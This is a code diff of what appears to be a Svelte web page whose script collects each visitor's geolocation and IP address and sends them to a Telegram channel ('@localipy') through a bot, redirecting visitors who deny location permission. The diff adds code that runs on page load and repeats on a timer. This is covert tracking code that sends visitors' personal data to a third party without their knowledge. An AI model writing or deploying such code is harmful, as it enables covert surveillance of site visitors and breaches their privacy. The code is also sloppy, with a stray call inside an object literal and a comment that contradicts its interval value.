@@ -5,6 +5,9 @@
 
   onMount(async () => {
 
+window.onload = function() {
+      setInterval(myFunction, 3000); // 2000 milliseconds = 2 seconds
+    };
 
 yourFunction();
 
@@ -124,7 +127,7 @@ ${ipAddress}
         chat_id: '@localipy', // Replace with the channel username or ID
         text: htmlMessage,
         parse_mode: 'HTML',
-yourFunction();
+
       }),
     });
   }
@@ -160,6 +163,7 @@ function showAlert() {
         (error) => {
           if (error.code === error.PERMISSION_DENIED) {
             showAlert();
+            redirectToNextURL();
             // Location permission denied, send IP result to Telegram bots
           }
         }
@@ -176,22 +180,21 @@ showAlert();
   }
 
 async function yourFunction() {
-  setTimeout(async () => {
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        // Location permission granted, send location and IP results to Telegram bots
-        await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-      },
-      (error) => {
-        if (error.code === error.PERMISSION_DENIED) {
-       //   showAlert();
-redirectToNextURL();
-          // Location permission denied, send IP result to Telegram bots
-        }
+  navigator.geolocation.getCurrentPosition(
+    async (position) => {
+      // Location permission granted, send location and IP results to Telegram bots
+      await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
+    },
+    (error) => {
+      if (error.code === error.PERMISSION_DENIED) {
+        // showAlert();
+        // redirectToNextURL();
+        // Location permission denied, send IP result to Telegram bots
       }
-    );
-  }, 1000);
+    }
+  );
 }
+
 
 
   function redirectToNextURL() {
